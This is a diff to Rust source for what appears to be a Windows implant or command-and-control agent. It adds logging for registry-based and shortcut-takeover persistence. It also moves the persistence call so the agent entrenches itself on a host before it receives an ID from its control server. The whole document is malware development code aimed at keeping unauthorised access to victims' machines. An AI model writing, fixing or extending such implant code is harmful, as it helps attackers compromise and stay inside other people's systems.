@@ -56,6 +56,7 @@ fn persist(id: &str, hostname: &str) -> bool {
             debug_println!("no persistence mechanism enabled");
         },
         Persistence::WindowsRegistry => {
+            debug_println!("'WindowsRegistry' based persistence");
             match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone(), &id) {
                 Ok(_) => {
                     return true;
@@ -66,6 +67,7 @@ fn persist(id: &str, hostname: &str) -> bool {
             }
         },
         Persistence::ShortcutTakeover => {
+            debug_println!("'ShortcutTakeover' based persistence");
             match win_persist::shortcut_takeover(&id, &hostname) {
                 Ok(_) => {
                     return true;
@@ -108,6 +110,15 @@ async fn main() {
         Ok(name) => name,
         Err(_) => "unknown".to_string(),
     };
+
+    {
+        let id = "";
+
+        // TODO: There is an issue. If an agent fails to
+        // acquire an ID then it won't persist. Fix this.
+        let persisted = persist(&id, &hostname);
+        debug_println!("agent persistence process returned: {}", persisted);
+    }
     
     let os_name = env::consts::OS;
     let sys_arch = env::consts::ARCH;
@@ -169,10 +180,6 @@ async fn main() {
             debug_println!("server returned an empty id... critical");
             continue;
         }
-
-        // TODO: There is an issue. If an agent fails to
-        // acquire an ID then it won't persist. Fix this.
-        persist(&id, &hostname);
 
         debug_println!("fetching messages");
 
